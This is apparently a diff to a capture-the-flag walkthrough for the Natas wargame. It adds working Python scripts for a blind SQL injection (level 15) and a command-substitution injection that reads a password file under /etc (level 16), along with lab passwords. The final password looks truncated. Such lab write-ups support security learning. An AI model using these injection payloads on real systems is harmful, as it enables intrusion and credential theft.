@@ -109,5 +109,52 @@
   * Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
 * level 15
+  * create a python script
+  ```py
+  import requests
+  import sys
+  from string import digits, ascii_lowercase, ascii_uppercase
+
+  url = "http://natas15.natas.labs.overthewire.org/"
+  charset = ascii_lowercase + ascii_uppercase + digits
+  sqli = 'natas16" AND password LIKE BINARY "'
+
+  s = requests.Session()
+  s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+
+  password = ""
+  while len(password) < 32:
+    for char in charset:
+        r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
+        if "This user exists" in r.text:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            password += char
+            break
+  ```
+  * Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
 * level 16
+  * create a python script
+  ```py
+  import requests
+  import sys
+  from string import digits, ascii_lowercase, ascii_uppercase
+
+  charset = ascii_lowercase + ascii_uppercase + digits
+  s = requests.Session()
+  s.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+
+  password = ""
+  while len(password) < 32:
+    for char in charset:
+        payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
+        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)
+
+        if len(r.text) == 1105:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            password += char
+            break
+  ```
+  * Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq 
